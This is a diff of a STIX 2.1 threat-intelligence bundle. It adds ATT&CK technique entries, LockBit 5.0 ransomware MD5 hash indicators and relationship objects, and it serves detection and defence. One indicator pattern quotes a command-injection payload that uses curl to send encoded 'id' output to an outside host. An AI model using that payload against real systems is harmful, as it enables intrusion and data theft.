@@ -1,6 +1,6 @@
 {
   "type": "bundle",
-  "id": "bundle--6aca83f0-b694-5c34-a0a5-149490800282",
+  "id": "bundle--216c045a-159a-5dff-983e-dfc22d0b13ea",
   "objects": [
     {
       "type": "attack-pattern",
@@ -447,6 +447,22 @@
           "source_name": "mitre-attack",
           "external_id": "T1573.002",
           "url": "https://attack.mitre.org/techniques/T1573/002"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "spec_version": "2.1",
+      "id": "attack-pattern--4c3e7380-a536-599a-8a1e-e402b95df8d6",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "name": "Data Encrypted for Impact",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1486",
+          "url": "https://attack.mitre.org/techniques/T1486"
         }
       ]
     },
@@ -1061,6 +1077,22 @@
     {
       "type": "attack-pattern",
       "spec_version": "2.1",
+      "id": "attack-pattern--bea84da1-fe85-5fa2-a60d-90c3c86b9473",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "name": "Server Software Component",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1505",
+          "url": "https://attack.mitre.org/techniques/T1505"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "spec_version": "2.1",
       "id": "attack-pattern--c2e6b7a7-4d3e-5088-b103-b0a679e94ab5",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -1422,6 +1454,32 @@
     {
       "type": "indicator",
       "spec_version": "2.1",
+      "id": "indicator--06f16ce4-0383-50f3-8303-e6bdcebced47",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: 2513d6678b476a432af2e84fff485b44",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = '2513d6678b476a432af2e84fff485b44']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--071242c2-4399-5ba8-8f7c-19ee188bdf4f",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: 8f718979876dd1050ce4f729d69e0072",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = '8f718979876dd1050ce4f729d69e0072']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
       "id": "indicator--2eb154ae-1ccb-5e68-aa60-a485cd250f30",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-01T23:00:52.000Z",
@@ -1431,6 +1489,32 @@
       "pattern": "[url:value = 'http://whitearz6uvtfdefgsc4r3mzmyswtte65k5umcmv6cu6zhi4l5k4irad.onion']",
       "pattern_type": "stix",
       "valid_from": "2026-11-01T23:00:52.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--37741032-7175-5ca3-83ca-78c8b9b83291",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: 95daa771a28eaed76eb01e1e8f403f7c",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = '95daa771a28eaed76eb01e1e8f403f7c']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--42962976-b688-56b1-9823-595379e2be8f",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: bf4443f6dbbdee8816aa9a1098374326",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = 'bf4443f6dbbdee8816aa9a1098374326']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
     },
     {
       "type": "indicator",
@@ -1461,6 +1545,32 @@
     {
       "type": "indicator",
       "spec_version": "2.1",
+      "id": "indicator--5abc469c-7535-55ad-8879-1562b03b77c2",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: a1539b21e5d6849a3e0cf87a4dc70335",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = 'a1539b21e5d6849a3e0cf87a4dc70335']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--69658970-8f9b-575d-9fa9-ef241bc4a655",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: 274e5ff2aa33e7ec980700e617eb2214",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = '274e5ff2aa33e7ec980700e617eb2214']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
       "id": "indicator--6d7ed014-4b2f-5233-bf23-b62b5a89d98b",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-03T07:07:48.000Z",
@@ -1487,6 +1597,84 @@
     {
       "type": "indicator",
       "spec_version": "2.1",
+      "id": "indicator--7309e6d0-9483-55c8-8535-8bf4cead2a5d",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: 2908589ca1a1f5d98c7f71563a3abac6",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = '2908589ca1a1f5d98c7f71563a3abac6']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--a40d7216-6a2a-5ecc-862c-8eaa2106ce06",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: 5e1f61b9c1c27cad3b7a81c804ac7b86",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = '5e1f61b9c1c27cad3b7a81c804ac7b86']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--b153733e-48cd-5ec5-8df3-46f6e11df27d",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: c462c6b02b35df2910689947c5090fae",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = 'c462c6b02b35df2910689947c5090fae']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--b9aea232-bd4f-5d84-a5c3-14d474318c96",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: ca93d47bcc55e2e1bd4a679afc8e2e25",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = 'ca93d47bcc55e2e1bd4a679afc8e2e25']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--bc0ea609-f3de-5c78-b767-bb709b8ba1cf",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: eb0c1d82187ec3fe980eed2419875e4b",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = 'eb0c1d82187ec3fe980eed2419875e4b']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--e3f47d4c-cd29-5658-826f-201ce56ae33d",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: e47032b3d1b9cbbcf77741d5d260004d",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = 'e47032b3d1b9cbbcf77741d5d260004d']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
       "id": "indicator--edd40fa4-0dc4-506f-b2da-330739905191",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-04T13:05:05.000Z",
@@ -1509,6 +1697,19 @@
       "pattern": "[url:value = 'http://attacker.example/$(curl$IFS-s$IFSsaldirgan.com/$(id|base64))']",
       "pattern_type": "stix",
       "valid_from": "2026-11-02T13:26:29.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--fa28c809-c186-50b5-9a67-bd3b8f537126",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "name": "hash_md5: 48b0a4505a96a640300e43e2af712276",
+      "description": "LockBit 5.0 ransomware payload",
+      "pattern": "[file:hashes.MD5 = '48b0a4505a96a640300e43e2af712276']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-03T15:31:26.000Z"
     },
     {
       "type": "relationship",
@@ -1619,6 +1820,17 @@
       "relationship_type": "uses",
       "source_ref": "report--d3167c2c-e394-5469-bd7a-a91c2b50f82f",
       "target_ref": "attack-pattern--e6e63efe-42b5-57bd-b4b7-a8415ab979eb"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--0312ed94-ac28-5255-9039-128f659545a3",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--b153733e-48cd-5ec5-8df3-46f6e11df27d"
     },
     {
       "type": "relationship",
@@ -1997,6 +2209,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--0b5704ff-6509-578d-8e67-bd5985003872",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--c24d25f1-e637-5b28-9478-699de25db42b",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--0bb64da0-d08d-5c18-8c5f-52db27e750ab",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -2096,6 +2319,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--0ee828f6-efc0-5585-89e2-3c7002400500",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--071242c2-4399-5ba8-8f7c-19ee188bdf4f"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--0ffe5231-42a1-539f-addb-965d4c6c7d73",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-04T16:19:52.000Z",
@@ -2114,6 +2348,17 @@
       "relationship_type": "has",
       "source_ref": "software--7ccc1751-3f28-5098-a697-b9f899b1ee6f",
       "target_ref": "vulnerability--9810ed3e-6071-52c9-8271-14d63885b5bc"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--101e2f4b-c613-5a21-895d-816b5aef9f4c",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--7cc614ab-516c-51d7-9ffa-f32fe405a8ac",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
     },
     {
       "type": "relationship",
@@ -2202,6 +2447,17 @@
       "relationship_type": "has",
       "source_ref": "software--c5bb5671-f87a-5db2-aa8d-b570a0d2f0b9",
       "target_ref": "vulnerability--3c7bb8e5-bf3b-5d9f-98f7-06386b6c2dc3"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--129e2c33-5107-5fbc-b944-b5b41965da53",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T03:50:17.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--af2dcc55-1faa-56fe-a969-08104814eacf",
+      "target_ref": "attack-pattern--bea84da1-fe85-5fa2-a60d-90c3c86b9473"
     },
     {
       "type": "relationship",
@@ -2503,6 +2759,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--18a2b624-918f-55f6-8386-a1421f9d6c8b",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--7309e6d0-9483-55c8-8535-8bf4cead2a5d"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--18fd7e1b-cd53-5382-a11f-0cbe5ba5608b",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -2701,6 +2968,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--1f49994f-d00a-5561-8d8b-a50ac3d9636f",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--56658c1c-d1d3-53b5-9db1-156dc5a5a424",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--1fca900d-5188-5a5c-bcf3-8feb11722a3d",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-03T03:19:20.000Z",
@@ -2840,6 +3118,28 @@
       "relationship_type": "has",
       "source_ref": "software--33b58796-0155-54f3-a279-3fa42bf31ae1",
       "target_ref": "vulnerability--371d4657-747d-5c4b-bc73-7f8f5efbfda3"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--24d21764-f60b-54ae-aedb-99907f52ba8f",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--e3f47d4c-cd29-5658-826f-201ce56ae33d"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--254fac8f-af31-5184-b528-6105d69c72bf",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--64057762-0adc-5b9b-be32-73953b9c9897",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
     },
     {
       "type": "relationship",
@@ -3680,6 +3980,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--3ab417e4-0695-5ca8-bcaa-8d49551c3921",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--f7d30204-5702-51c7-a160-c6923ea50a84",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--3ab4ab20-4db6-5629-9b79-627e872c71ac",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-11-01T08:57:56.000Z",
@@ -3709,6 +4020,17 @@
       "relationship_type": "has",
       "source_ref": "software--8003e401-12fb-547c-924a-1266e68e5542",
       "target_ref": "vulnerability--468478d6-a1e7-5c93-b24a-cdf0b4b2e99d"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--3b5ddf75-2f5d-5c27-bd82-4b5954506341",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--a40d7216-6a2a-5ecc-862c-8eaa2106ce06"
     },
     {
       "type": "relationship",
@@ -4050,6 +4372,28 @@
       "relationship_type": "has",
       "source_ref": "software--4d6ede8b-dd81-50d3-b324-489d91f8b5fb",
       "target_ref": "vulnerability--1657bcf6-203f-57e3-b01b-0eee568bcdff"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--445d021a-8099-538b-9ec4-215058a0ea18",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--06f16ce4-0383-50f3-8303-e6bdcebced47"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--44f0ca13-4475-5ed5-8777-fb052fcd6489",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--69658970-8f9b-575d-9fa9-ef241bc4a655"
     },
     {
       "type": "relationship",
@@ -4956,6 +5300,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--5c19e49c-60aa-5f52-ada6-f085726c5cdb",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--37741032-7175-5ca3-83ca-78c8b9b83291"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--5c33be75-5af5-574b-95a8-ecb5f75ccf6c",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -5007,6 +5362,17 @@
       "relationship_type": "uses",
       "source_ref": "report--a55074b2-ee31-5efe-bf0c-1780b47ac2dd",
       "target_ref": "attack-pattern--03c83a54-7fcd-5e1a-99d5-88d0bbd8fb19"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--5d0157a1-b3a2-5680-85a0-622f247388c6",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--b9aea232-bd4f-5d84-a5c3-14d474318c96"
     },
     {
       "type": "relationship",
@@ -5385,6 +5751,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--669199e6-bfb8-56b9-a826-7393c2e69dfa",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--ffbab69e-70ac-5e4a-8011-02774d500969",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--6715e354-7638-5888-b25e-b290003756ec",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -5392,6 +5769,17 @@
       "relationship_type": "has",
       "source_ref": "software--e3ce3a9e-95d9-533c-adfe-6c98ead22a11",
       "target_ref": "vulnerability--af6c5549-0dad-52be-a63a-19217c26c718"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--6716deea-183d-57ea-8692-261f5c00d5fa",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T03:50:17.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--af2dcc55-1faa-56fe-a969-08104814eacf",
+      "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
     },
     {
       "type": "relationship",
@@ -5671,6 +6059,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--6e139b69-eb5d-5772-94c6-8894fd40b4a6",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--72e6a636-6535-560c-a591-3651e83afbbb",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--6e43ca31-45d9-5eb2-ae27-78e28c413e30",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -5722,6 +6121,17 @@
       "relationship_type": "has",
       "source_ref": "software--d613524e-c377-5294-bd5c-4e54e61c0a5c",
       "target_ref": "vulnerability--a154334e-29b1-50db-8f61-0681d4c13b4c"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--7017367a-a0ae-5b06-aa0c-18a9b2b92a36",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--f7d30204-5702-51c7-a160-c6923ea50a84",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
     },
     {
       "type": "relationship",
@@ -5946,6 +6356,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--75599f37-eda9-5114-8a79-f0647a237172",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--e97a3e4e-61c2-5fae-a0b0-45410b4b0ee3",
+      "target_ref": "vulnerability--39d886de-ca7c-54e2-9876-495935ac6cc4"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--75c365b1-fc67-5040-9672-341520042a09",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -6118,6 +6539,17 @@
       "relationship_type": "uses",
       "source_ref": "report--89ed36ac-63bd-5f4b-a1a2-885c1d147f61",
       "target_ref": "attack-pattern--01b0e09b-1506-5d2d-8ffa-f7854bbc1154"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--79639586-2f63-57d3-a90d-3cbf6593e3ed",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "attributed-to",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "threat-actor--b23fad01-b25a-5627-9487-9f6e4e961825"
     },
     {
       "type": "relationship",
@@ -6353,6 +6785,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--7ed9df77-4118-5f5a-8e22-7cf82fb882dd",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--ffbab69e-70ac-5e4a-8011-02774d500969",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--7f0c46e9-07d8-5c90-9e8d-ff3bc76c29df",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -6518,6 +6961,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--83563591-2f81-57df-a540-8456ecd75081",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-03T15:31:26.000Z",
+      "modified": "2026-11-05T08:54:12.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--a96df22b-af21-5e13-bc13-551888b2bde0",
+      "target_ref": "indicator--42962976-b688-56b1-9823-595379e2be8f"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--8448b013-1750-5849-a7b0-8151f9b99a6e",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -6536,6 +6990,17 @@
       "relationship_type": "has",
       "source_ref": "software--c07ec93a-b3a9-5fb8-ba4a-fce522de9824",
       "target_ref": "vulnerability--1657bcf6-203f-57e3-b01b-0eee568bcdff"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--84a8e504-d7b9-55f9-8557-33457707aecb",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--c8ad540c-140c-5a44-91b9-e3607f16c592",
+      "target_ref": "vulnerability--a43ad61c-e0cc-5015-b75b-b8f0de1c87b2"
     },
     {
       "type": "relationship",
@@ -6580,6 +7045,17 @@
       "relationship_type": "uses",
       "source_ref": "report--c2bd6979-cd11-5fd4-bc6c-2c2c6e4d49d8",
       "target_ref": "attack-pattern--03c83a54-7fcd-5e1a-99d5-88d0bbd8fb19"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--86f1afee-ac39-5b69-b3b7-aa8cb85cbaec",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--edda04b5-e755-58e3-aca7-a496409a409f",
